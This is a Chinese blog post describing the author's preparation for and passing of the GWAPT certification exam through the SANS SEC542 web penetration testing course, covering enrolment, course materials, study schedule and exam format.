<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
<link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin>
  <link rel="apple-touch-icon" sizes="180x180" href="../../images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="../../images/favicon_32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="../../images/favicon_16.png">
  <link rel="mask-icon" href="../../images/logo.svg" color="#222">

<link rel="stylesheet" href="../../css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.20/fancybox/fancybox.css" integrity="sha256-RvRHGSuWAxZpXKV9lLDt2e+rZ+btzn48Wp4ueS3NZKs=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-bounce.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"upwnothing.github.io","root":"/","images":"../../images","scheme":"Gemini","darkmode":true,"version":"8.18.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":true,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"../../search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="../../js/config.js"></script>

    <meta name="description" content="最终以91%的分数通过GWAPT考试">
<meta property="og:type" content="article">
<meta property="og:title" content="GWAPT认证考试总结">
<meta property="og:url" content="https://upwnothing.github.io/zh-CN/bef99fab/index.html">
<meta property="og:site_name" content="UPWNothing&#39;s Playground">
<meta property="og:description" content="最终以91%的分数通过GWAPT考试">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2021-10-15T02:38:30.000Z">
<meta property="article:modified_time" content="2022-02-21T09:25:18.235Z">
<meta property="article:author" content="UPWNothing">
<meta property="article:tag" content="Certification">
<meta property="article:tag" content="GWAPT">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://upwnothing.github.io/zh-CN/bef99fab/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://upwnothing.github.io/zh-CN/bef99fab/","path":"zh-CN/bef99fab/","title":"GWAPT认证考试总结"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>GWAPT认证考试总结 | UPWNothing's Playground</title>
  
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-125116918-1"></script>
  <script class="next-config" data-name="google_analytics" type="application/json">{"tracking_id":"UA-125116918-1","only_pageview":false}</script>
  <script src="../../js/third-party/analytics/google-analytics.js"></script>







<script type="text/javascript">
    // Wait for the page to load first
    var _prevOnload = window.onload;
    window.onload = function() {
        var switchLang = document.getElementsByClassName("menu-item-switch_lang")[0].childNodes[1];
            var href = window.location.href;     
            var indexOfEn = href.toLowerCase().indexOf('/en/');
            if(indexOfEn !== -1) {
                //switchLang.href = href.replace('/en/', '/');
		//switchLang.href = "https://upwnothing.github.io";
                switchLang.href = href.substr(0,indexOfEn);
            }
            else {
                //switchLang.href = href.replace(/(^http[s]?:\/\/[a-z0-9.]*[:?0-9]*\/)(.*)/i, '$1en/$2');
		//switchLang.href = "https://upwnothing.github.io/en";
            }
    }
</script>
<script data-ad-client="ca-pub-2179953596008833" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>

  <noscript>
    <link rel="stylesheet" href="../../css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">UPWNothing's Playground</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">一个关于安全的小宝箱</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="../../index.html" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="../../about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="../../categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">11</span></a></li><li class="menu-item menu-item-archives"><a href="../../archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">26</span></a></li><li class="menu-item menu-item-switch_lang"><a href="../../en/" rel="section"><i class="fa falanguage fa-fw"></i>switch_lang</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="nav-number">1.</span> <span class="nav-text">准备工作</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%BE%E7%A8%8B%E7%AE%80%E4%BB%8B"><span class="nav-number">1.1.</span> <span class="nav-text">课程简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%BE%E7%A8%8B%E6%8A%A5%E5%90%8D%E6%B3%A8%E5%86%8C"><span class="nav-number">1.2.</span> <span class="nav-text">课程报名注册</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%BE%E7%A8%8B%E5%85%88%E6%9C%9F%E5%87%86%E5%A4%87"><span class="nav-number">1.3.</span> <span class="nav-text">课程先期准备</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SEC542%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0"><span class="nav-number">2.</span> <span class="nav-text">SEC542课程学习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BD%91%E8%AF%BE%E7%95%8C%E9%9D%A2"><span class="nav-number">2.1.</span> <span class="nav-text">网课界面</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E5%AE%89%E6%8E%92"><span class="nav-number">2.2.</span> <span class="nav-text">时间安排</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%BE%E7%A8%8B%E5%AE%9E%E9%AA%8C"><span class="nav-number">2.3.</span> <span class="nav-text">课程实验</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87"><span class="nav-number">3.</span> <span class="nav-text">考试准备</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Section-1-Introduction-and-Information-Gathering"><span class="nav-number">4.</span> <span class="nav-text">Section 1: Introduction and Information Gathering</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Why-the-Web"><span class="nav-number">4.1.</span> <span class="nav-text">Why the Web?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Application-Assessment-Methodologies"><span class="nav-number">4.2.</span> <span class="nav-text">Application Assessment Methodologies</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Course-Logistics"><span class="nav-number">4.3.</span> <span class="nav-text">Course Logistics</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-Application-Pen-Tester%E2%80%99s-Toolkit"><span class="nav-number">4.4.</span> <span class="nav-text">Web Application Pen Tester’s Toolkit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WHOIS-and-DNS"><span class="nav-number">4.5.</span> <span class="nav-text">WHOIS and DNS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#OSINT-%EF%BC%88Open-Source-INTelligence"><span class="nav-number">4.6.</span> <span class="nav-text">OSINT （Open Source INTelligence)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP-Syntax-and-Messaging"><span class="nav-number">4.7.</span> <span class="nav-text">HTTP Syntax and Messaging</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP-Semantics"><span class="nav-number">4.8.</span> <span class="nav-text">HTTP Semantics</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTPS-and-Testing-for-Weak-Ciphers"><span class="nav-number">4.9.</span> <span class="nav-text">HTTPS and Testing for Weak Ciphers</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Interception-Proxies"><span class="nav-number">4.10.</span> <span class="nav-text">Interception Proxies</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Configuration-Identity-and-Authentication-Testing"><span class="nav-number">5.</span> <span class="nav-text">Configuration, Identity, and  Authentication Testing</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Target-Profiling"><span class="nav-number">5.1.</span> <span class="nav-text">Target Profiling</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Shellshock"><span class="nav-number">5.2.</span> <span class="nav-text">Shellshock</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Insufficient-Logging-and-Monitoring"><span class="nav-number">5.3.</span> <span class="nav-text">Insufficient Logging and Monitoring</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Spidering-Web-Application"><span class="nav-number">5.4.</span> <span class="nav-text">Spidering Web Application</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Forced-Browsing"><span class="nav-number">5.5.</span> <span class="nav-text">Forced Browsing</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Fuzzing"><span class="nav-number">5.6.</span> <span class="nav-text">Fuzzing</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Information-Leakage"><span class="nav-number">5.7.</span> <span class="nav-text">Information Leakage</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Authentication"><span class="nav-number">5.8.</span> <span class="nav-text">Authentication</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Username-Harvesting"><span class="nav-number">5.9.</span> <span class="nav-text">Username Harvesting</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Burp-Intruder"><span class="nav-number">5.10.</span> <span class="nav-text">Burp Intruder</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Injection"><span class="nav-number">6.</span> <span class="nav-text">Injection</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Session-Management"><span class="nav-number">6.1.</span> <span class="nav-text">Session Management</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Session-Attack"><span class="nav-number">6.2.</span> <span class="nav-text">Session Attack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Authentication-Bypass"><span class="nav-number">6.3.</span> <span class="nav-text">Authentication Bypass</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Authorization-Bypass"><span class="nav-number">6.4.</span> <span class="nav-text">Authorization Bypass</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Mutillidae"><span class="nav-number">6.5.</span> <span class="nav-text">Mutillidae</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Command-Injection"><span class="nav-number">6.6.</span> <span class="nav-text">Command Injection</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#File-Inclusion-and-Directory-Traversal"><span class="nav-number">6.7.</span> <span class="nav-text">File Inclusion and Directory Traversal</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Insecure-Deserialization"><span class="nav-number">6.8.</span> <span class="nav-text">Insecure Deserialization</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL-Injection-Primer"><span class="nav-number">6.9.</span> <span class="nav-text">SQL Injection Primer</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Discovering-SQLi"><span class="nav-number">6.10.</span> <span class="nav-text">Discovering SQLi</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploiting-SQLi"><span class="nav-number">6.11.</span> <span class="nav-text">Exploiting SQLi</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XXE-and-XSS"><span class="nav-number">7.</span> <span class="nav-text">XXE and XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#XXE"><span class="nav-number">7.1.</span> <span class="nav-text">XXE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Document-Object-Model-DOM"><span class="nav-number">7.2.</span> <span class="nav-text">Document Object Model (DOM)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-Primer"><span class="nav-number">7.3.</span> <span class="nav-text">XSS Primer</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Classes-of-XSS"><span class="nav-number">7.4.</span> <span class="nav-text">Classes of XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-Discovery"><span class="nav-number">7.5.</span> <span class="nav-text">XSS Discovery</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-impacts"><span class="nav-number">7.6.</span> <span class="nav-text">XSS impacts</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-Tools"><span class="nav-number">7.7.</span> <span class="nav-text">XSS Tools</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BeEF"><span class="nav-number">7.8.</span> <span class="nav-text">BeEF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#AJAX"><span class="nav-number">7.9.</span> <span class="nav-text">AJAX</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CSRF"><span class="nav-number">7.10.</span> <span class="nav-text">CSRF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Logic-Attacks"><span class="nav-number">7.11.</span> <span class="nav-text">Logic Attacks</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Python"><span class="nav-number">7.12.</span> <span class="nav-text">Python</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WPScan"><span class="nav-number">7.13.</span> <span class="nav-text">WPScan</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Metasploit"><span class="nav-number">7.14.</span> <span class="nav-text">Metasploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Drupal"><span class="nav-number">7.15.</span> <span class="nav-text">Drupal</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#When-Tools-Fail"><span class="nav-number">7.16.</span> <span class="nav-text">When Tools Fail</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Business-of-Pentesting-Preparation"><span class="nav-number">7.17.</span> <span class="nav-text">Business of Pentesting: Preparation</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Methodology"><span class="nav-number">7.18.</span> <span class="nav-text">Methodology</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Post-Assessment"><span class="nav-number">7.19.</span> <span class="nav-text">Post Assessment</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="UPWNothing"
      src="../../images/icon.jpeg">
  <p class="site-author-name" itemprop="name">UPWNothing</p>
  <div class="site-description" itemprop="description">记录一个N00b在网络安全的知识树里，不断向前探索过程中的所见所闻</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="../../archives/">
          <span class="site-state-item-count">26</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="../../categories/">
        <span class="site-state-item-count">11</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">38</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="返回顶部">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://upwnothing.github.io/zh-CN/bef99fab/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="../../images/icon.jpeg">
      <meta itemprop="name" content="UPWNothing">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="UPWNothing's Playground">
      <meta itemprop="description" content="记录一个N00b在网络安全的知识树里，不断向前探索过程中的所见所闻">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="GWAPT认证考试总结 | UPWNothing's Playground">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          GWAPT认证考试总结
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-10-15 10:38:30" itemprop="dateCreated datePublished" datetime="2021-10-15T10:38:30+08:00">2021-10-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2022-02-21 17:25:18" itemprop="dateModified" datetime="2022-02-21T17:25:18+08:00">2022-02-21</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="../../categories/Security/" itemprop="url" rel="index"><span itemprop="name">Security</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="../../categories/Security/Pentest/" itemprop="url" rel="index"><span itemprop="name">Pentest</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">阅读次数：</span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>18k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>16 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><p>最终以91%的分数通过GWAPT考试</p>
<span id="more"></span>


<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><h2 id="课程简介"><a href="#课程简介" class="headerlink" title="课程简介"></a>课程简介</h2><p>SEC542 课程的主旨是帮助学生可以不仅限于对Web Application进行”一键扫描”，而是可以对于一些重要的Web Application进行更加专业、彻底的渗透测试。</p>
<p>在整个课程的过程中，学生可以学习如何评估一个Web Application的安全状态，并可以具有说服力地阐述攻击者通过对已发现的漏洞的利用可以产生怎么样的业务影响。除了授课的内容之外，SEC542还提供了许多实验环境，可以让学生立刻将课程中学习到的知识应用于实践。</p>
<p>总结起来，通过这门课程，可以学习到：</p>
<ul>
<li>可反复应用在高价值的渗透测试中的方法论</li>
<li>如何去发现并利用一个Web Application中的关键缺陷</li>
<li>如何来阐述一个Web Application的漏洞可能造成的影响</li>
<li>Web Application安全对于系统整体安全状况的重要性</li>
<li>如何更高效地使用Web Application攻击工具</li>
<li>如何撰写一份Web Application渗透测试报告</li>
</ul>
<p>在学习完SEC542课程，通过 GWAPT 考试后，学生能够：</p>
<ul>
<li>将OWASP标准的测试步骤应用在Web Application的渗透测试中，以此来确保每一次的渗透测试都可以满足一致性，可复制性，严谨程度以及质量要求</li>
<li>分析从自动话测试工具中得到的结果，以验证发现，确定其对业务的影响并消除误报</li>
<li>手动发现Web应用程序的关键缺陷。</li>
<li>在渗透测试期间，使用Python创建测试和利用脚本。</li>
<li>发现并利用SQL Injection漏洞，以此来确定受害组织的真实风险。</li>
<li>使用ysoserial和类似工具来理解和利用不安全的反序列化漏洞。</li>
<li>创建配置并测试其他类型的Web攻击中的有效负载。</li>
<li>对潜在的注入攻击进行Fuzz测试。</li>
<li>解释利用Web应用程序漏洞可能造成影响。</li>
<li>使用诸如Zed Attack Proxy和BurpSuite Pro之类的工具分析客户端与服务器应用程序之间的流量，以发现客户端应用程序代码中的安全问题。</li>
<li>手动发现和利用跨站点请求伪造（CSRF）攻击。</li>
<li>使用浏览器利用框架（BeEF）来hook被攻击的浏览器，攻击客户端软件和网络，并评估XSS漏洞对应用程序的潜在影响。</li>
<li>执行两次完整的网络渗透测试，一次在课程教学的五天内进行，另一次在“CTF”练习中进行。</li>
</ul>
<p>SANS SEC542这门课程对应的证书是 GIAC Web Application Penetration Tester (GWAPT)。 这个证书在全球范围内还是很有分量的，在国内相对来说不是那么的广为人知。从课程的角度来说，SANS的课程是非常优秀的。但是GWAPT考试的形式是2个小时的选择题。这种考试形式相比于OSCP这种更注重于实操的证书而言，相对就不是那么的具有含金量了。当然还有另外一个很重要的原因：SEC542真的很贵！！！</p>
<p>至于说我是不是推荐这门课程呢… 考虑到价格因素的话，我不推荐个人来报名这门课程。如果公司可以报销这笔培训费用，从职业发展角度，又比较期望在外企发展的话，那这个证书还是非常值得花时间去考一下的。毕竟在外企，这个证书的认可度还是非常高的。</p>
<h2 id="课程报名注册"><a href="#课程报名注册" class="headerlink" title="课程报名注册"></a>课程报名注册</h2><p>SEC542这门课，可以通过SANS官网直接报名。大多数SANS的课程应该是以线下的形式进行授课，但是由于在中国SANS暂时没有提供线下授课的场所，而今年由于疫情的影响，即便在国外，很多线下课程也很难展开。所以对于SEC542这门课，SANS同时也提供了Live Online的版本，适应于不同的时间与地区。可惜的是，这些时间对于中国而言，大多数都不是非常友好。而且，实际工作的过程中，也很难真正抽出一个礼拜，每天八个小时地来参加培训。所以最后我还是选择了OnDemand的模式。OnDemand模式采用的是录像的方式，没有讲师实时进行授课。但好处是，参加课程的同学可以比较自由的安排培训的时间，只要在4个月的时间段内，根据自己的需求，安排学习计划即可。当然，由于没有讲师实时授课，所以会缺少与讲师的互动。如果在课程过程中遇到问题，只能通过邮件的方式进行咨询。（当然，这种对于中国学生来说或许不算太大的问题）</p>
<p>注册其实很简单，就付钱就好了。SANS各种付款方式都支持的。但是使用信用卡网络付款的话，SANS对账单地址的检查非常严格。如果有错的话，支付非常容易不通过。我就遇到了类似的问题，最后打美国的客服电话，在线支付才完成的。</p>
<p>一个bundle中包括了SEC542的培训，2次考试模拟以及最终认账测试，还有书面教材邮寄的费用。当然，费用属实非常贵……</p>
<p><a href="price.jpg">price of SEC542</a></p>
<h2 id="课程先期准备"><a href="#课程先期准备" class="headerlink" title="课程先期准备"></a>课程先期准备</h2><p>完成注册后，进入课程目录，总共有3份可下载的文档：</p>
<p><a href="handouts.jpg"></a></p>
<ul>
<li>My Labs<br>这是一份实验环境连接的说明文档。因为在课程过程中的第六个部分，我们需要完成一个”CTF”练习。 在练习前，我们需要对网络进行适当的配置，这样才能顺利地通过VPN连接到实验环境。</li>
<li>Quick Start Guide<br>课程地快速上手指南。这算是一份归纳文档，针对刚完成报名的同学，简单整理了一下比较常见的问题：有哪些课程相关的材料，如何开始课程，如何与SANS的客服联系等等…</li>
<li>VMware Software License Handout<br>SANS随课程还提供了VMware一年期的license。好东西!跟着这份文档操作就可以获取并且激活。</li>
</ul>
<p>除此之外，还有一系列多媒体文件可以下载：</p>
<ul>
<li>虚拟机的镜像文件</li>
<li>课程的MP3录音</li>
<li>SANS一些与渗透测试相关的印刷品。包含了一些工具的Cheatsheet。还算制作精美</li>
<li>课程完整讲义的电子版</li>
</ul>
<p>课程的讲义会通过邮寄的方式发送给我们。不知道是不是因为疫情的原因，邮寄的周期比较长，可能会要1-2周。<br><strong>讲义对于考试来说还是非常有用的。因为是开卷考试，有不少题目涉及到的知识点也可以在讲义中找到。所以在考试前一定要熟悉各个考点在讲义中出现的位置。</strong></p>
<h1 id="SEC542课程学习"><a href="#SEC542课程学习" class="headerlink" title="SEC542课程学习"></a>SEC542课程学习</h1><h2 id="网课界面"><a href="#网课界面" class="headerlink" title="网课界面"></a>网课界面</h2><p>SANS的ONDEMAND课程的界面功能还是比较强大的。毕竟收了这么多钱，倒也不是白花的<br><a href="course_UI.jpg"></a></p>
<p>课程的整体语速还是非常友好的。对于英语环境比较习惯的 可以尝试在某些部分使用1.2倍速播放。</p>
<h2 id="时间安排"><a href="#时间安排" class="headerlink" title="时间安排"></a>时间安排</h2><p>由于有一定的时间限制，所以这次从报名到考试的完整周期在一个月之内。网课我基本在三周内全部完成，包括网课中相关的实验课程。最后留一周的时间完成模拟题，熟悉讲义，回顾所有的知识点。</p>
<p>至于说从准备开始到考试究竟留多长时间合适，这完全取决于每个人的情况。首先是在渗透测试方面的基础，如果本来就或多或少了解渗透测试，甚至有参与过渗透测试的话，那这门课程学习的难度就相对较小，整个课程听下来应该会非常顺利，不需要耗费太多的时间去理解课程的知识。还有就是每天可以用于SEC542的时间是多少。所以整个备考的天数也是因人而异的， 建议先开始课程，有一个大致的预估后，再预约考试时间。</p>
<h2 id="课程实验"><a href="#课程实验" class="headerlink" title="课程实验"></a>课程实验</h2><p>SEC542提供了一个虚拟机镜像作为课程的实验环境。任何时候，对于渗透测试的技能来说，实验的靶机永远都是比课程讲义更有价值的学习工具。很多是后就是靠着不断的练习操作，来积累经验，不断学习。<br>但是反过来说，对于GWAPT考试而言，实验环境的内容可能就显得没有那么重要了。不过，我相信如果会报名这个课程的，一定不会仅仅是为了获得一个证书吧。肯定还是希望在实际的操作上获得一定的提升的。</p>
<h1 id="考试准备"><a href="#考试准备" class="headerlink" title="考试准备"></a>考试准备</h1><p>应对考试，首先我们需要针对考试的类型进行复习。 </p>
<p>GWAPT考试采用单项选择题的方式，总共75道题，时间限制为2个小时。GWAPT的考试属于是开卷考试，考生可以使用课程讲义以及一张A4纸大小的”小抄”作为参考资料。一般建议把小抄作为索引，然后可以通过这种方式快速地在讲义中定位到相关知识点。题目的难度其实相对来说不算很大，大多数题目都可以在讲义中找到。只需要简单的理解就可以了。总体而言，我认为通过考试应该不算是一件很难的事情。</p>
<h1 id="Section-1-Introduction-and-Information-Gathering"><a href="#Section-1-Introduction-and-Information-Gathering" class="headerlink" title="Section 1: Introduction and Information Gathering"></a>Section 1: Introduction and Information Gathering</h1><h2 id="Why-the-Web"><a href="#Why-the-Web" class="headerlink" title="Why the Web?"></a>Why the Web?</h2><p>这一部分算是课程的前言，主要是一些背景铺垫。讲师自己的背景介绍，Web Application的历史背景，Web Application安全的发展过程，以及现状等等。</p>
